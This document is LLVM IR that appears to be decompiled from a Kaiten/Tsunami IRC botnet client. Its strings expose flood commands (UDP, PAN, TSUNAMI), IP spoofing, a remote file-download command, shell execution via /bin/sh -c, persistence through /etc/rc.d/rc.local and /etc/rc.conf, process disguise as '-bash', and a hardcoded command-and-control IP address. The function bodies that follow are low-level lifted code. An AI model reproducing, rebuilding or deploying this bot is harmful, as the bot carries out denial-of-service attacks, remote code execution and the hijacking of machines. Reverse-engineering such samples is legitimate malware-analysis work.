source_filename = "test"
target datalayout = "E-p:32:32:32-f80:32:32"

%0 = type { i1, i1, i1, i1, i4, i4, i4, i4, i4, i4, i4 }
%1 = type { i1, i1, i1, i1, i4, i4, i4, i4, i4, i4, i4 }
%2 = type { i1, i1, i1, i1 }

@r1 = internal unnamed_addr global i32 0
@r3 = internal unnamed_addr global i32 0
@r4 = internal unnamed_addr global i32 0
@r5 = internal unnamed_addr global i32 0
@r6 = internal unnamed_addr global i32 0
@r9 = internal unnamed_addr global i32 0
@r10 = internal unnamed_addr global i32 0
@r11 = internal unnamed_addr global i32 0
@r19 = internal unnamed_addr global i32 0
@r20 = internal unnamed_addr global i32 0
@r21 = internal unnamed_addr global i32 0
@r22 = internal unnamed_addr global i32 0
@r23 = internal unnamed_addr global i32 0
@r24 = internal unnamed_addr global i32 0
@r25 = internal unnamed_addr global i32 0
@r26 = internal unnamed_addr global i32 0
@r27 = internal unnamed_addr global i32 0
@r28 = internal unnamed_addr global i32 0
@r29 = internal unnamed_addr global i32 0
@r30 = internal unnamed_addr global i32 0
@r31 = internal unnamed_addr global i32 0
@cr0_so = internal unnamed_addr global i1 false
@cr4 = internal unnamed_addr global i4 0
@lr = internal unnamed_addr global i32 0
@global_var_100000a4.1 = constant i32 1208013433
@global_var_10010000.2 = global i32 -1
@global_var_1001000c.4 = global i32 0
@global_var_1001001c.5 = local_unnamed_addr global i32* @global_var_1001000c.4
@global_var_100104e4.7 = global i32 0
@global_var_100104fc.8 = global i32 0
@global_var_10010478.10 = local_unnamed_addr global i32 0
@global_var_1000d3b8.11 = constant [30 x i8] c"NOTICE %s :Unable to comply.\0A\00"
@global_var_1000053c.12 = constant i32 939524097
@global_var_10010468.13 = local_unnamed_addr global i32 0
@global_var_1001048c.14 = local_unnamed_addr global i32 0
@global_var_10010464.16 = local_unnamed_addr global i32 0
@global_var_1000d3d8.17 = constant [16 x i8] c"/usr/dict/words\00"
@global_var_1000d3e8.18 = constant i32 1912602624
@global_var_10010470.19 = local_unnamed_addr global i32 0
@global_var_1000d3ec.20 = constant [25 x i8] c"%s : USERID : UNIX : %s\0A\00"
@global_var_10000d78.21 = constant [3 x i8] c"8`\00"
@global_var_1000d408.22 = constant [33 x i8] c"NOTICE %s :GET <host> <save as>\0A\00"
@global_var_10000f90.23 = constant [3 x i8] c"8`\00"
@global_var_10000f98.24 = constant [3 x i8] c"8`\00"
@global_var_1000d42c.25 = constant [37 x i8] c"NOTICE %s :Unable to create socket.\0A\00"
@global_var_10000fd8.26 = constant [3 x i8] c"8`\00"
@global_var_1000d454.27 = constant [8 x i8] c"http://\00"
@global_var_1000102c.28 = constant i32 1207959584
@global_var_1000104c.29 = constant i32 939524096
@global_var_1000d45c.30 = constant [39 x i8] c"NOTICE %s :Unable to resolve address.\0A\00"
@global_var_10001124.31 = constant [3 x i8] c"8`\00"
@global_var_1000112c.32 = constant [3 x i8] c"9?\00"
@global_var_1000115c.33 = constant i32 1207959564
@global_var_1000d484.34 = constant [39 x i8] c"NOTICE %s :Unable to connect to http.\0A\00"
@global_var_100011b8.35 = constant [3 x i8] c"8`\00"
@global_var_1000d4ac.36 = constant [276 x i8] c"GET /%s HTTP/1.0\0D\0AConnection: Keep-Alive\0D\0AUser-Agent: Mozilla/4.75 [en] (X11; U; Linux 2.2.16-3 i686)\0D\0AHost: %s:80\0D\0AAccept: image/gif, image/x-xbitmap, image/jpeg, image/pjpeg, image/png, */*\0D\0AAccept-Encoding: gzip\0D\0AAccept-Language: en\0D\0AAccept-Charset: iso-8859-1,*,utf-8\0D\0A\0D\0A\00"
@global_var_1000d5c0.37 = constant [28 x i8] c"NOTICE %s :Receiving file.\0A\00"
@global_var_1000d5dc.38 = constant [3 x i8] c"wb\00"
@global_var_1000d5e0.39 = constant [5 x i8] c"\0D\0A\0D\0A\00"
@global_var_10001344.40 = constant i32 1207959588
@global_var_1000d5e8.41 = constant [24 x i8] c"NOTICE %s :Saved as %s\0A\00"
@global_var_100014a8.42 = constant i32 1207959588
@global_var_100014fc.43 = constant [3 x i8] c"8`\00"
@global_var_1000d600.44 = constant [32 x i8] c"NOTICE %s :Spoofs: %d.%d.%d.%d\0A\00"
@global_var_100015f4.45 = constant i32 1207959756
@global_var_1000d620.46 = constant [46 x i8] c"NOTICE %s :Spoofs: %d.%d.%d.%d - %d.%d.%d.%d\0A\00"
@global_var_1000d650.47 = constant [29 x i8] c"NOTICE %s :Kaiten wa goraku\0A\00"
@global_var_1000d670.48 = constant [24 x i8] c"NOTICE %s :NICK <nick>\0A\00"
@global_var_10001780.49 = constant i32 1207959652
@global_var_1000d688.50 = constant [53 x i8] c"NOTICE %s :Nick cannot be larger than 9 characters.\0A\00"
@global_var_100017bc.51 = constant i32 1207959592
@global_var_1000d6c0.52 = constant [9 x i8] c"NICK %s\0A\00"
@global_var_1000d6cc.53 = constant [27 x i8] c"NOTICE %s :DISABLE <pass>\0A\00"
@global_var_1000d6e8.54 = constant [9 x i8] c"Disabled\00"
@global_var_1000d6f4.55 = constant [28 x i8] c"Enabled and awaiting orders\00"
@global_var_1000d710.56 = constant [35 x i8] c"NOTICE %s :Current status is: %s.\0A\00"
@global_var_10001890.57 = constant i32 1207959752
@global_var_1000d734.58 = constant [30 x i8] c"NOTICE %s :Already disabled.\0A\00"
@global_var_100018c0.59 = constant i32 1207959704
@global_var_1000d754.60 = constant [37 x i8] c"NOTICE %s :Password too long! > 254\0A\00"
@global_var_100018fc.61 = constant i32 1207959644
@global_var_10012b24.62 = global i32 0
@global_var_1000d77c.63 = constant [31 x i8] c"NOTICE %s :Disable sucessful.\0A\00"
@global_var_1000d79c.64 = constant [26 x i8] c"NOTICE %s :ENABLE <pass>\0A\00"
@global_var_10001a04.65 = constant i32 1207959708
@global_var_1000d7b8.66 = constant [29 x i8] c"NOTICE %s :Already enabled.\0A\00"
@global_var_10001a34.67 = constant i32 1207959660
@global_var_1000d7d8.68 = constant [27 x i8] c"NOTICE %s :Wrong password\0A\00"
@global_var_10001a78.69 = constant i32 1207959592
@global_var_1000d7f4.70 = constant [30 x i8] c"NOTICE %s :Password correct.\0A\00"
@global_var_1000d814.71 = constant [31 x i8] c"NOTICE %s :Removed all spoofs\0A\00"
@global_var_1000d834.72 = constant [75 x i8] c"NOTICE %s :What kind of subnet address is that? Do something like: 169.40\0A\00"
@global_var_10001b58.73 = constant i32 1207959952
@global_var_1001046c.76 = global i32 0
@global_var_1000d884.77 = constant [33 x i8] c"NOTICE %s :Unable to resolve %s\0A\00"
@global_var_10001d88.78 = constant [3 x i8] c"8`\00"
@global_var_1000d8a8.79 = constant [39 x i8] c"NOTICE %s :UDP <target> <port> <secs>\0A\00"
@global_var_10001e80.80 = constant [3 x i8] c"8`\00"
@global_var_1000d8d0.81 = constant [26 x i8] c"NOTICE %s :Packeting %s.\0A\00"
@global_var_100020f0.82 = constant i32 939524096
@global_var_1000d8ec.83 = constant i32 2
@global_var_10002164.84 = constant i32 939524096
@global_var_1000d93c.85 = constant [39 x i8] c"NOTICE %s :PAN <target> <port> <secs>\0A\00"
@global_var_100021bc.86 = constant [3 x i8] c"8`\00"
@global_var_100021c4.87 = constant [3 x i8] c"8`\00"
@global_var_100021f0.88 = constant i32 939524096
@global_var_1000d964.89 = constant [24 x i8] c"NOTICE %s :Panning %s.\0A\00"
@global_var_1000254c.90 = constant [3 x i8] c"9?\00"
@global_var_100025f0.91 = constant i32 939524096
@global_var_1000d97c.92 = constant [36 x i8] c"NOTICE %s :TSUNAMI <target> <secs>\0A\00"
@global_var_10002698.93 = constant [3 x i8] c"8`\00"
@global_var_100026e8.94 = constant [3 x i8] c"8`\00"
@global_var_10002708.95 = constant i32 1207984081
@global_var_1000d9a0.96 = constant [36 x i8] c"NOTICE %s :Tsunami heading for %s.\0A\00"
@global_var_10002980.97 = constant [3 x i8] c"9?\00"
@global_var_10002a3c.98 = constant [3 x i8] c"8`\00"
@global_var_10010480.106 = local_unnamed_addr global i32 0
@global_var_10010458.107 = local_unnamed_addr global i32 0
@global_var_10010488.143 = local_unnamed_addr global i32 0
@global_var_10010474.145 = local_unnamed_addr global i32 0
@global_var_1000e16c.158 = constant [13 x i8] c"MODE %s -xi\0A\00"
@global_var_10010484.159 = local_unnamed_addr global i32 0
@global_var_1000e17c.160 = constant [13 x i8] c"JOIN %s :%s\0A\00"
@global_var_1000e18c.161 = constant [8 x i8] c"WHO %s\0A\00"
@global_var_1000e194.162 = constant [9 x i8] c"PONG %s\0A\00"
@global_var_1000e1a0.163 = constant [93 x i8] c"NOTICE %s :I'm having a problem resolving my host, someone will have to SPOOFS me manually.\0A\00"
@global_var_10003b84.164 = constant i32 1207959720
@global_var_10010410.168 = local_unnamed_addr global i32 1
@global_var_1000d3a8.169 = constant [16 x i8] c"212.109.222.122\00"
@global_var_10010414.170 = global [16 x i8]* @global_var_1000d3a8.169
@global_var_10003f14.171 = constant i32 1207959580
@global_var_10003f6c.172 = constant [3 x i8] c"8`\00"
@global_var_1000402c.173 = constant i32 1207959668
@global_var_10004060.174 = constant [3 x i8] c"8`\00"
@global_var_1000e220.175 = constant [19 x i8] c"/etc/rc.d/rc.local\00"
@global_var_1000e234.176 = constant [13 x i8] c"/etc/rc.conf\00"
@global_var_1000e244.177 = constant i32 788529152
@global_var_1000e248.178 = constant [8 x i8] c"\22%s%s\22\0A\00"
@global_var_100041ec.179 = constant i32 1207959620
@global_var_1000e250.180 = constant i32 1627389952
@global_var_10004294.181 = constant i32 1207959576
@global_var_100042a0.182 = constant i32 1207959564
@global_var_100042ac.183 = constant i32 1207961681
@global_var_1000e254.184 = constant [6 x i8] c"-bash\00"
@global_var_100042f4.185 = constant i32 939524097
@global_var_1001047c.186 = local_unnamed_addr global i32 0
@global_var_1000e25c.187 = constant [4 x i8] c"#AS\00"
@global_var_1000e260.188 = constant i32 0
@global_var_1000e264.189 = constant [41 x i8] c"NICK %s\0AUSER %s localhost localhost :%s\0A\00"
@global_var_10004438.190 = constant i32 1207959556
@global_var_1000e290.191 = constant i32 167772160
@global_var_10004820.192 = constant i32 1207959568
@global_var_100048c8.193 = constant i32 939524096
@global_var_1000e200.194 = constant [4 x i8] c"352\00"
@global_var_100100a4.195 = global [4 x i8]* @global_var_1000e200.194
@global_var_1000e294.196 = constant [6 x i8] c"ERROR\00"
@global_var_10004a4c.197 = constant i32 1207959564
@global_var_10004c24.198 = constant i32 1207959560
@global_var_100104ac.199 = local_unnamed_addr global i32 0
@global_var_100104bc.204 = global i32 0
@global_var_100091f8.205 = constant [3 x i8] c"8`\00"
@global_var_100100fc.206 = global i32 0
@global_var_10010494.207 = local_unnamed_addr global i32 0
@global_var_10010498.208 = local_unnamed_addr global i32 0
@global_var_10004f74.209 = constant i32 1207966665
@global_var_100108fc.210 = global i32 0
@global_var_10010490.211 = local_unnamed_addr global i32 0
@global_var_10005168.212 = constant i32 939524118
@global_var_10005240.213 = constant i32 939524096
@global_var_10005264.214 = constant [3 x i8] c"9`\00"
@global_var_100052d4.215 = constant i32 1207959864
@global_var_100052fc.217 = constant i32 1207976533
@global_var_1000e59c.218 = constant [8 x i8] c"/bin/sh\00"
@global_var_1000e5a4.219 = constant [3 x i8] c"sh\00"
@global_var_1000e5a8.220 = constant [3 x i8] c"-c\00"
@global_var_10005384.221 = constant [3 x i8] c"8`\00"
@global_var_10005400.222 = constant i32 1207959580
@global_var_10005414.223 = constant i32 939524096
@global_var_1000549c.224 = constant i32 1207960120
@global_var_1001043c.225 = local_unnamed_addr global i32 2
@global_var_100100e4.226 = global i32 0
@global_var_10010438.227 = global i32* bitcast (i16* @global_var_10010114.201 to i32*)
@global_var_100056d0.228 = constant i32 1207959560
@global_var_10005720.229 = constant [3 x i8] c" c\00"
@global_var_1000573c.230 = constant [3 x i8] c" c\00"
@global_var_1000e5b0.231 = constant i32 0
@global_var_100059d8.232 = constant i32 1207961092
@global_var_10005b04.233 = constant i32 1207960768
@global_var_1000e5e4.234 = constant i32 269488136
@global_var_1000e5c8.235 = constant [6 x i8] c"(nil)\00"
@global_var_1000e5d0.236 = constant [7 x i8] c"(null)\00"
@global_var_1000e5d8.237 = constant i32 721431808
@global_var_10005f60.238 = constant i32 939524096
@global_var_1000e664.239 = constant i32 65793
@global_var_1000e64c.240 = constant i32 524293
@global_var_1001044c = external local_unnamed_addr global i32
@global_var_1000f60e.242 = constant i32 1
@global_var_1000e644.243 = constant [8 x i8] c" +0-#'I\00"
@global_var_1000e5ec.244 = constant [9 x i8] c"hlLjztqZ\00"
@global_var_1000e62c.245 = constant [21 x i8] c"npxXoudifFeEgGaACScs\00"
@global_var_1000e620.246 = constant i32 67343
@global_var_1000e61f.247 = constant i32 50331911
@global_var_1000e610.248 = constant i32 268435461
@global_var_1000e600.249 = constant i32 520093701
@global_var_1000691c.250 = constant [3 x i8] c"8a\00"
@global_var_10006d10.251 = constant i32 1207959708
@global_var_10006db8.252 = constant i32 1207959612
@global_var_10007028.253 = constant i32 939589631
@global_var_100070dc.254 = constant i32 939524118
@global_var_1000e680.255 = constant [8 x i8] c"Success\00"
@global_var_1000e670.256 = constant [15 x i8] c"Unknown error \00"
@global_var_10010454.257 = local_unnamed_addr global i32* @global_var_1000f60e.242
@global_var_1001049c.258 = global i32 0
@global_var_10012ae0.259 = global i32 0
@global_var_10012914.260 = global i32 0
@global_var_100103e0.261 = global i32 0
@global_var_100104c8.262 = local_unnamed_addr global i32 0
@global_var_10012d4c.263 = global i32 0
@global_var_10007da4.264 = constant [3 x i8] c"8`\00"
@global_var_10007e88.265 = constant i32 939524098
@global_var_10007ec8.266 = constant [3 x i8] c"8`\00"
@global_var_10012af4.267 = global i32 0
@global_var_10010440 = external global i32
@global_var_10012d24.270 = global i32 0
@global_var_100081d4.271 = constant i32 939524108
@global_var_1000826c.272 = constant [3 x i8] c"8`\00"
@global_var_10008318.273 = constant [3 x i8] c"8`\00"
@global_var_10008640.274 = constant i32 1207959640
@global_var_1000867c.275 = constant i32 1207959580
@global_var_10010310.276 = global i32 0
@global_var_10010328 = external global i32
@global_var_10010348.278 = global i32 -1726662223
@global_var_10010330.279 = local_unnamed_addr global i32* @global_var_10010348.278
@global_var_1001032c.280 = global i32* @global_var_10010348.278
@global_var_1000f1dc.281 = constant i32 0
@global_var_10008994.282 = constant i32 939524118
@global_var_10008da8.283 = constant i32 939524130
@global_var_100103c4.284 = global i32 0
@global_var_100104a0.285 = local_unnamed_addr global i32 0
@global_var_10008e3c.286 = constant i32 1207960361
@global_var_100104a8.287 = local_unnamed_addr global i32 0
@global_var_100104b0.288 = local_unnamed_addr global i32 0
@global_var_100104b4.289 = local_unnamed_addr global i32 0
@global_var_1000f204.290 = constant [10 x i8] c"/dev/null\00"
@global_var_100104b8.291 = local_unnamed_addr global i32 0
@global_var_100104a4.292 = local_unnamed_addr global i32 0
@global_var_10009510.293 = constant i32 939524096
@global_var_1000952c.294 = constant i32 939524096
@global_var_10009550.295 = constant i32 939524285
@global_var_100104dc.296 = local_unnamed_addr global i32 0
@global_var_10009a38.297 = constant i32 939524118
@global_var_100104c0.298 = global i32 0
@global_var_10009b78.299 = constant i32 939524180
@global_var_10009ef8.300 = constant i32 939524105
@global_var_1000f838.301 = constant [4 x i8] c"inf\00"
@global_var_1000f83b.303 = constant i32 4804166
@global_var_1000f848.304 = constant i32 771763200
@global_var_10012b0c.306 = global i32 0
@global_var_100104c4.307 = local_unnamed_addr global i32 0
@global_var_1000aeac.309 = constant i32 1207960848
@global_var_100104cc.310 = local_unnamed_addr global i32 0
@global_var_1000f898.311 = constant i32 771751936
@global_var_10012d3c.312 = global i32 0
@global_var_1000af9c.313 = constant [3 x i8] c"8a\00"
@global_var_1000afa8.314 = constant i32 939524097
@global_var_1000b07c.315 = constant i32 939524097
@global_var_1000b150.316 = constant i32 939524097
@global_var_1000b17c.317 = constant i32 939524100
@global_var_1000b25c.318 = constant i32 1207959684
@global_var_1000b3d8.319 = constant i32 939589631
@global_var_1000f8b4.320 = constant i32 1912602624
@global_var_1000f8a0.321 = constant [17 x i8] c"/etc/resolv.conf\00"
@global_var_1000f8b8.322 = constant [24 x i8] c"/etc/config/resolv.conf\00"
@global_var_1000f8d0.323 = constant [11 x i8] c"nameserver\00"
@global_var_1000f8dc.324 = constant [7 x i8] c"domain\00"
@global_var_1000f8e4.325 = constant [7 x i8] c"search\00"
@global_var_1000b710.326 = constant i32 1207959568
@global_var_1000b718.327 = constant i32 939524099
@global_var_100103f8.328 = global i32 0
@global_var_1000b928.329 = constant i32 939524129
@global_var_100104d0.330 = local_unnamed_addr global i32 0
@global_var_1000b99c.331 = constant [3 x i8] c"8`\00"
@global_var_1000b9d4.332 = constant i32 939524129
@global_var_100104d4.333 = local_unnamed_addr global i32 0
@global_var_100104d8.334 = local_unnamed_addr global i32 0
@global_var_1000bde4.335 = constant i32 939524171
@global_var_1000be94.336 = constant i32 939524105
@global_var_1000c1e0.337 = constant [3 x i8] c"8`\00"
@global_var_1000f900.338 = constant [17 x i8] c"0123456789abcdef\00"
@global_var_1000c3d8.339 = constant [3 x i8] c"9 \00"
@global_var_1000c3e4.340 = constant i32 939524193
@global_var_1000c44c.342 = constant i32 939524101
@global_var_1000c538.343 = constant i32 939524124
@global_var_1000c5b0.344 = constant i32 1207960116
@global_var_1000c5c8.345 = constant i32 939524105
@global_var_1000c740.346 = constant [3 x i8] c"9 \00"
@global_var_1000f914.347 = constant [3 x i8] c"%x\00"
@global_var_1000c7cc.348 = constant i32 939524124
@global_var_1000c7f0.349 = constant i32 939524193
@global_var_1000f918.350 = constant [11 x i8] c"/etc/hosts\00"
@global_var_1000f924.351 = constant [18 x i8] c"/etc/config/hosts\00"
@global_var_1000cedc.352 = constant i32 1207959560
@global_var_1000cf74.353 = constant i32 939589631
@global_var_10010004.354 = global i32 0
@global_var_100104e0.3 = local_unnamed_addr global i8 0
@global_var_1001045c.9 = local_unnamed_addr global i8 0
@global_var_10010460.15 = external local_unnamed_addr global i8*
@global_var_10010463.165 = external local_unnamed_addr global i8*
@global_var_10010462.166 = external local_unnamed_addr global i8*
@global_var_10010461.167 = external global i8*
@global_var_10010114.201 = global i16 288
@global_var_10010164.202 = local_unnamed_addr global i16 272
@global_var_100103dc.308 = local_unnamed_addr global i16 1

declare void @__pseudo_call(i32) local_unnamed_addr

declare void @__pseudo_cond_branch(i1, i32) local_unnamed_addr

define i32 @function_10000094() local_unnamed_addr {
entry:
  store i32 ptrtoint (i32* @global_var_100000a4.1 to i32), i32* @lr, align 4
  %v0_100000a0 = call i32 @function_10000168()
  store i32 %v0_100000a0, i32* @r3, align 4
  store i32 268435624, i32* @lr, align 4
  %v1_100000a4 = call i32 @function_1000d31c(i32 %v0_100000a0)
  ret i32 %v1_100000a4
}

define i32 @function_100000b8() local_unnamed_addr {
entry:
  %v3_100000cc = load i8, i8* @global_var_100104e0.3, align 1
  %v3_100000d4 = icmp eq i8 %v3_100000cc, 0
  br i1 %v3_100000d4, label %dec_label_pc_100000dc, label %dec_label_pc_10000134

dec_label_pc_100000dc:                            ; preds = %entry
  %v3_100000e0 = load i32, i32* bitcast (i32** @global_var_1001001c.5 to i32*), align 4
  %v3_100000e8 = icmp eq i32 %v3_100000e0, 0
  br i1 %v3_100000e8, label %dec_label_pc_10000110, label %dec_label_pc_100000f0

dec_label_pc_100000f0:                            ; preds = %dec_label_pc_100000dc, %dec_label_pc_100000f0
  %v0_100000f4 = phi i32 [ %v3_10000100, %dec_label_pc_100000f0 ], [ %v3_100000e0, %dec_label_pc_100000dc ]
  %v1_100000f0 = add i32 %v0_100000f4, 4
  store i32 %v1_100000f0, i32* bitcast (i32** @global_var_1001001c.5 to i32*), align 4
  call void @__pseudo_call(i32 %v0_100000f4)
  %v3_10000100 = load i32, i32* bitcast (i32** @global_var_1001001c.5 to i32*), align 4
  %v3_10000108 = icmp eq i32 %v3_10000100, 0
  br i1 %v3_10000108, label %dec_label_pc_10000110, label %dec_label_pc_100000f0

dec_label_pc_10000110:                            ; preds = %dec_label_pc_100000f0, %dec_label_pc_100000dc
  store i8 1, i8* @global_var_100104e0.3, align 1
  br label %dec_label_pc_10000134

dec_label_pc_10000134:                            ; preds = %entry, %dec_label_pc_10000110
  ret i32 undef

; uselistorder directives
  uselistorder i32 %v3_10000100, { 1, 0 }
  uselistorder i8* @global_var_100104e0.3, { 1, 0 }
  uselistorder label %dec_label_pc_10000134, { 1, 0 }
  uselistorder label %dec_label_pc_100000f0, { 1, 0 }
}

define i32 @function_1000014c() local_unnamed_addr {
dec_label_pc_1000014c:
  %v0_10000164 = load i32, i32* @r3, align 4
  ret i32 %v0_10000164
}

define i32 @function_10000168() local_unnamed_addr {
dec_label_pc_10000168:
  %v3_100001a0 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_10010000.2 to i32), i32 16) to i32*), align 4
  %v3_100001ac = icmp eq i32 %v3_100001a0, 0
  br i1 %v3_100001ac, label %dec_label_pc_100001c4, label %dec_label_pc_100001b4

dec_label_pc_100001b4:                            ; preds = %dec_label_pc_10000168
  br label %dec_label_pc_100001c4

dec_label_pc_100001c4:                            ; preds = %dec_label_pc_100001b4, %dec_label_pc_10000168
  ret i32 add (i32 ptrtoint (i32* @global_var_10010000.2 to i32), i32 16)
}

define i32 @function_100001d4() local_unnamed_addr {
dec_label_pc_100001d4:
  %v0_100001ec = load i32, i32* @r3, align 4
  ret i32 %v0_100001ec
}

define i32 @entry_point(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  %stack_var_4 = alloca i32, align 4
  %stack_var_0 = alloca i32, align 4
  store i32 %arg2, i32* %stack_var_0, align 4
  %v0_100001f4 = load i32, i32* @r1, align 4
  %v1_100001f4 = call i32 @__asm_rlwinm(i32 %v0_100001f4, i32 0, i32 0, i32 27)
  store i32 0, i32* %r0.global-to-local, align 4
  %v2_10000204 = add i32 %v1_100001f4, -16
  %v3_10000204 = inttoptr i32 %v2_10000204 to i32*
  store i32 %v1_100001f4, i32* %v3_10000204, align 4
  %v0_10000208 = load i32, i32* %r0.global-to-local, align 4
  store i32 %v0_10000208, i32* %v3_10000204, align 4
  %v2_10000210 = load i32, i32* %stack_var_0, align 4
  %v7_10000234 = call i32 @function_100092e4(i32 268452024, i32 %v2_10000210, i32* nonnull %stack_var_4, i32 268435604, i32 add (i32 ptrtoint (i32* @global_var_10010000.2 to i32), i32 -11384), i32 %arg1)
  ret i32 %v7_10000234

; uselistorder directives
  uselistorder i32 %v1_100001f4, { 1, 0 }
  uselistorder i32* %stack_var_0, { 1, 0 }
}

define i32 @function_10000238(i8* %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
dec_label_pc_10000238:
  %tmp = inttoptr i32 %arg2 to i8*
  %tmp8 = ptrtoint i8* %arg1 to i32
  %v2_1000025c = load i8, i8* %arg1, align 1
  %v3_1000026c = icmp eq i8 %v2_1000025c, 42
  br i1 %v3_1000026c, label %dec_label_pc_100002a4, label %dec_label_pc_10000274

dec_label_pc_10000274:                            ; preds = %dec_label_pc_10000238
  %v3_10000278 = icmp eq i8 %v2_1000025c, 63
  br i1 %v3_10000278, label %dec_label_pc_10000318, label %dec_label_pc_10000280

dec_label_pc_10000280:                            ; preds = %dec_label_pc_10000274
  %v3_10000284 = icmp eq i8 %v2_1000025c, 0
  br i1 %v3_10000284, label %dec_label_pc_10000290, label %dec_label_pc_10000374

dec_label_pc_10000290:                            ; preds = %dec_label_pc_10000280
  %v2_10000294 = load i8, i8* %tmp, align 1
  %v3_10000294 = zext i8 %v2_10000294 to i32
  br label %dec_label_pc_100003f8

dec_label_pc_100002a4:                            ; preds = %dec_label_pc_10000238
  %v2_100002a8 = add i32 %tmp8, 1
  store i32 268436152, i32* @lr, align 4
  %v5_100002b4 = inttoptr i32 %v2_100002a8 to i8*
  %v6_100002b4 = call i32 @function_10000238(i8* %v5_100002b4, i32 %arg2, i32 %tmp8)
  %v3_100002bc = icmp eq i32 %v6_100002b4, 0
  br i1 %v3_100002bc, label %dec_label_pc_10000304, label %dec_label_pc_100002c4

dec_label_pc_100002c4:                            ; preds = %dec_label_pc_100002a4
  %v2_100002c8 = load i8, i8* %tmp, align 1
  %v3_100002d0 = icmp eq i8 %v2_100002c8, 0
  br i1 %v3_100002d0, label %dec_label_pc_1000030c, label %dec_label_pc_100002d8

dec_label_pc_100002d8:                            ; preds = %dec_label_pc_100002c4
  %v2_100002dc = add i32 %arg2, 1
  store i32 268436204, i32* @lr, align 4
  %v6_100002e8 = call i32 @function_10000238(i8* nonnull %arg1, i32 %v2_100002dc, i32 %arg2)
  %v3_100002f0 = icmp eq i32 %v6_100002e8, 0
  br i1 %v3_100002f0, label %dec_label_pc_10000304, label %dec_label_pc_1000030c

dec_label_pc_10000304:                            ; preds = %dec_label_pc_100002d8, %dec_label_pc_100002a4
  br label %dec_label_pc_1000030c

dec_label_pc_1000030c:                            ; preds = %dec_label_pc_100002c4, %dec_label_pc_100002d8, %dec_label_pc_10000304
  %storemerge3 = phi i32 [ 0, %dec_label_pc_10000304 ], [ 1, %dec_label_pc_100002d8 ], [ 1, %dec_label_pc_100002c4 ]
  br label %dec_label_pc_100003f8

dec_label_pc_10000318:                            ; preds = %dec_label_pc_10000274
  %v2_1000031c = load i8, i8* %tmp, align 1
  %v3_10000324 = icmp eq i8 %v2_1000031c, 0
  br i1 %v3_10000324, label %dec_label_pc_10000368, label %dec_label_pc_1000032c

dec_label_pc_1000032c:                            ; preds = %dec_label_pc_10000318
  %v1_10000330 = add i32 %tmp8, 1
  %v2_10000338 = add i32 %arg2, 1
  store i32 268436296, i32* @lr, align 4
  %v4_10000344 = inttoptr i32 %v1_10000330 to i8*
  %v5_10000344 = call i32 @function_10000238(i8* %v4_10000344, i32 %v2_10000338, i32 %arg2)
  %v3_1000034c = icmp ne i32 %v5_10000344, 0
  %. = zext i1 %v3_1000034c to i32
  br label %dec_label_pc_10000368

dec_label_pc_10000368:                            ; preds = %dec_label_pc_1000032c, %dec_label_pc_10000318
  %storemerge2 = phi i32 [ 1, %dec_label_pc_10000318 ], [ %., %dec_label_pc_1000032c ]
  br label %dec_label_pc_100003f8

dec_label_pc_10000374:                            ; preds = %dec_label_pc_10000280
  %v3_10000378 = load i8, i8* %arg1, align 1
  %v4_10000378 = zext i8 %v3_10000378 to i32
  store i32 268436364, i32* @lr, align 4
  %v3_10000388 = call i32 @function_10004e18(i32 %v4_10000378, i32 %tmp8)
  %v3_10000394 = load i8, i8* %tmp, align 1
  %v4_10000394 = zext i8 %v3_10000394 to i32
  store i32 268436392, i32* @lr, align 4
  %v3_100003a4 = call i32 @function_10004e18(i32 %v4_10000394, i32 %arg2)
  %v4_100003ac = icmp eq i32 %v3_10000388, %v3_100003a4
  br i1 %v4_100003ac, label %dec_label_pc_100003b4, label %dec_label_pc_100003f0

dec_label_pc_100003b4:                            ; preds = %dec_label_pc_10000374
  %v1_100003b8 = add i32 %tmp8, 1
  %v2_100003c0 = add i32 %arg2, 1
  store i32 268436432, i32* @lr, align 4
  %v4_100003cc = inttoptr i32 %v1_100003b8 to i8*
  %v5_100003cc = call i32 @function_10000238(i8* %v4_100003cc, i32 %v2_100003c0, i32 %arg2)
  %v3_100003d4 = icmp ne i32 %v5_100003cc, 0
  %.7 = zext i1 %v3_100003d4 to i32
  br label %dec_label_pc_100003f0

dec_label_pc_100003f0:                            ; preds = %dec_label_pc_100003b4, %dec_label_pc_10000374
  %storemerge = phi i32 [ 1, %dec_label_pc_10000374 ], [ %.7, %dec_label_pc_100003b4 ]
  br label %dec_label_pc_100003f8

dec_label_pc_100003f8:                            ; preds = %dec_label_pc_10000368, %dec_label_pc_1000030c, %dec_label_pc_10000290, %dec_label_pc_100003f0
  %stack_var_-36.0 = phi i32 [ %storemerge3, %dec_label_pc_1000030c ], [ %storemerge2, %dec_label_pc_10000368 ], [ %v3_10000294, %dec_label_pc_10000290 ], [ %storemerge, %dec_label_pc_100003f0 ]
  ret i32 %stack_var_-36.0

; uselistorder directives
  uselistorder i8* %tmp, { 0, 2, 3, 1 }
  uselistorder i32 (i32, i32)* @function_10004e18, { 1, 0 }
  uselistorder i32 %arg2, { 5, 6, 7, 3, 4, 0, 1, 2, 8 }
  uselistorder label %dec_label_pc_100003f8, { 3, 0, 1, 2 }
  uselistorder label %dec_label_pc_1000030c, { 2, 1, 0 }
}

define i32 @function_1000041c(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
dec_label_pc_1000041c:
  %stack_var_-136 = alloca i32, align 4
  store i32 2, i32* %stack_var_-136, align 4
  store i32 ptrtoint (i32* @global_var_100104fc.8 to i32), i32* @r3, align 4
  %v2_100004a0 = ptrtoint i32* %stack_var_-136 to i32
  store i32 268436652, i32* @lr, align 4
  %v4_100004a8 = call i32 @function_10004f9c(i32 ptrtoint (i32* @global_var_100104fc.8 to i32), i32 %arg2, i32 %v2_100004a0, i32 ptrtoint (i32* @global_var_10010000.2 to i32))
  store i32 ptrtoint (i32* @global_var_100104fc.8 to i32), i32* @r3, align 4
  %v0_100004b4 = call i32 @function_10007288()
  store i32 268436688, i32* @lr, align 4
  %v2_100004cc = call i32 @function_10004dd0(i32 %arg1, i32 ptrtoint (i32* @global_var_100104fc.8 to i32))
  ret i32 %v2_100004cc

; uselistorder directives
  uselistorder i32* %stack_var_-136, { 1, 0 }
  uselistorder i32 ptrtoint (i32* @global_var_100104fc.8 to i32), { 1, 2, 0, 3 }
}

define i32 @function_100004f0(i32 %arg1) local_unnamed_addr {
dec_label_pc_100004f0:
  %v3_1000050c = load i8, i8* @global_var_1001045c.9, align 1
  %v3_10000514 = icmp eq i8 %v3_1000050c, 1
